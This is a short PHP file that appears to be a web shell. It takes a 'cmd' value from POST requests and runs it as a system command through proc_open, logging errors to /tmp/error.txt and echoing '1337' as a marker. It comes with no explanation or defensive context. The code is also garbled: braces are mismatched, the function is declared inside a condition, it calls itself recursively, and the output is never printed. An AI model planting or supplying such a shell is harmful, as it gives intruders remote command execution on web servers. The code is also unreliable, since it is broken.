<?php
  if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    
  function exec_cmd($cmd){
    {
      $descriptorspec = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("file", "/tmp/error.txt", "a")
      );
      $process = proc_open($cmd, $descriptorspec, $pipes);
      if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        proc_close($process);
        return $output;
      }exec_cmd($cmd); exit;
    }else{
      echo "1337";
    }
  }
  }
?>
